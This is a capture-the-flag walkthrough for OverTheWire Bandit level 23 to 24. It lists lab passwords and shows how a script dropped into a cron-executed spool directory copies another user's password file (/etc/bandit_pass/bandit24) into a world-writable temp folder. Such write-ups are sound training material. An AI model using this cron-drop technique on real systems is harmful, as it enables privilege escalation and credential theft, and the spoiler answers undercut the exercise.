# Bandit Level 23 → Level 24

## 🧠 Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

---

## 🔐 Credentials

- **Username:** `bandit23`
- **Host:** `bandit.labs.overthewire.org`
- **Port:** `2220`
- **Password:** `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`

---

## 🖥️ Commands Used

```bash
bandit23@bandit:/etc/cron.d$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls -l
total 28
-rw-r--r-- 1 root root 123 Apr 10 14:16 clean_tmp
-rw-r--r-- 1 root root 120 Apr 10 14:23 cronjob_bandit22
-rw-r--r-- 1 root root 122 Apr 10 14:23 cronjob_bandit23
-rw-r--r-- 1 root root 120 Apr 10 14:23 cronjob_bandit24
-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
-rwx------ 1 root root  52 Apr 10 14:24 otw-tmp-dir
-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat

bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

#bandit23@bandit:/etc/cron.d$ ls /etc      this will show you many folders incloding bandit_pass

bandit23@bandit:/etc/cron.d$ mktemp -d /tmp/amro.XXX
/tmp/amro.Cml

bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/amro.Cml
bandit23@bandit:/etc/cron.d$ cd /tmp/amro.Cml
bandit23@bandit:/tmp/amro.Cml$ nano copy_pass.sh
# #!/bin/bash
# cat /etc/bandit_pass/bandit24 > /tmp/amro.Cml/pass24

bandit23@bandit:/tmp/amro.Cml$ chmod 777 copy_pass.sh

bandit23@bandit:/tmp/amro.Cml$ cp copy_pass.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/amro.Cml$ date
Wed Apr 23 07:37:51 PM UTC 2025
bandit23@bandit:/tmp/amro.Cml$ ls
copy_pass.sh

bandit23@bandit:/tmp/amro.Cml$ date
Wed Apr 23 07:38:02 PM UTC 2025
bandit23@bandit:/tmp/amro.Cml$ ls
copy_pass.sh  pass24
bandit23@bandit:/tmp/amro.Cml$ cat pass24
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8


```
___

## 💡 Tips
make an executable script inside an executable tmp folder "this script copies the pass of the level to this folder again whithin a new file" 
copy this file to the location where every file is executed
then wait less than 60 seconds and look at the pass

note: both the file you create and the folder that will recieve the pass should be in executable format
___

## 📤 Output
```bash
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

